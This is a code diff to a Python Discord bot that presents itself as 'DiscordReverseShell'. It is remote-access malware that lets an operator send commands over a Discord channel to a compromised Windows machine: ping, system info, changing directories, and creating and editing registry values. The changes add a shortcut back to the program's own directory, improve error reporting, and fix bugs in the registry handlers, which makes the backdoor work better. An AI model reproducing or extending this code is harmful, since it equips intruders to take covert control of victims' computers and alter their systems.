@@ -220,8 +220,6 @@ def unblock_input():
 
 @client.event
 async def on_ready():
-    #global channel
-    
     guild = client.get_guild(int(GUILD_ID))
     channel = await guild.create_text_channel(session_id)
     embed = discord.Embed(title="New session created", description="", color=0xfafafa)
@@ -259,8 +257,7 @@ async def on_message(message):
 
 #PING
     elif message.content == "ping":
-        msg = f"PONG, `{round(client.latency * 1000)}ms`"
-        await message.reply(content=msg)
+        await message.reply(f"PONG, `{round(client.latency * 1000)}ms`")
 
 #! SYSTEM INFO
     elif message.content == "sys":
@@ -319,6 +316,12 @@ async def on_message(message):
 #! CD
     elif message.content.startswith("cd"):
         directory = message.content[3:] #.split(" ")[1]
+        if directory == "root": 
+            os.chdir(os.path.dirname(sys.argv[0]))
+            embed = discord.Embed(title="Changed Directory to ROOT", description=f"```{os.getcwd()}```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+            return
         try:
             os.chdir(directory)
             embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
@@ -659,7 +662,7 @@ async def on_message(message):
 
         elif action == "2":
             try:
-                data = msg[10:].split(" ")
+                data = message.content[10:].split(" ")
                 
                 root_path, key_path = data[0].split("\\", 1)
                 root_key = winreg.ConnectRegistry(None, getattr(winreg, root_path))
@@ -683,15 +686,15 @@ async def on_message(message):
                 embed = discord.Embed(title="Regedit", description=f"```Created new value: {value_name}\nValue data: {value_data}\nValue type: {value_type}\nKey path: {data[0]}```", color=0xfafafa)
                 embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                 await message.reply(embed=embed)
-            except:
-                embed = discord.Embed(title="Regedit", description="```Invalid key path or value name!```", color=0xfafafa)
+            except Exception as e:
+                embed = discord.Embed(title="Regedit", description=f"```Invalid key path or value name!\nERROR: {e}```", color=0xfafafa)
                 embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
                 await message.reply(embed=embed)
                 return
 
         elif action == "3":
             try:
-                data = msg[10:].split(" ")
+                data = message.content[10:].split(" ")
                 
                 root_path, key_path = data[0].split("\\", 1)
                 root_key = winreg.ConnectRegistry(None, getattr(winreg, root_path))
